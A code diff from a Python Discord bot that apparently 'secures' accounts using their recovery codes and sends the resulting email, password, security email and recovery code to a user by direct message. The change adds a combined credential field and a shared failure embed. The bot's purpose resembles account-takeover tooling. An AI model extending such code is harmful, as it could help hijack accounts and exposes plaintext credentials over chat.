@@ -3,7 +3,7 @@ import discord
 import logging
 
 from securing.recovery_secure import recovery_secure
-from securing.build_embeds import build_failure_embed
+from securing.build_embeds import add_credential_line_field, build_failure_embed
 from ui.buttons.account_details import accountInfo
 
 log = logging.getLogger(__name__)
@@ -31,6 +31,14 @@ async def _send_early_credentials(user: discord.User | discord.Member, creds: di
     embed.add_field(name="Security Email", value=f"```{creds.get('security_email', '?')}```", inline=True)
     embed.add_field(name="Password", value=f"```{creds.get('password', '?')}```", inline=True)
     embed.add_field(name="Recovery Code", value=f"```{creds.get('recovery_code', '?')}```", inline=False)
+    add_credential_line_field(
+        embed,
+        email=creds.get("email", ""),
+        recovery=creds.get("recovery_code", ""),
+        password=creds.get("password", ""),
+        security_email=creds.get("security_email", ""),
+        username=creds.get("username", ""),
+    )
     try:
         await user.send(embed=embed)
     except discord.Forbidden:
@@ -98,12 +106,11 @@ class recoveryCodeModal(ui.Modal):
             return
 
         if not account:
-            fail_embed = discord.Embed(
-                title="Failed to secure account",
-                description="Make sure your recovery code is correct and that 2FA is disabled",
-                color=0x2765F5,
+            fail_embed = build_failure_embed(
+                email,
+                {},
+                "Make sure your recovery code is correct and that 2FA is disabled",
             )
-            fail_embed.add_field(name="Email", value=f"```{email}```", inline=False)
             await interaction.followup.send(embed=fail_embed, ephemeral=True)
             await _send_failure_dm(interaction.user, fail_embed)
             return
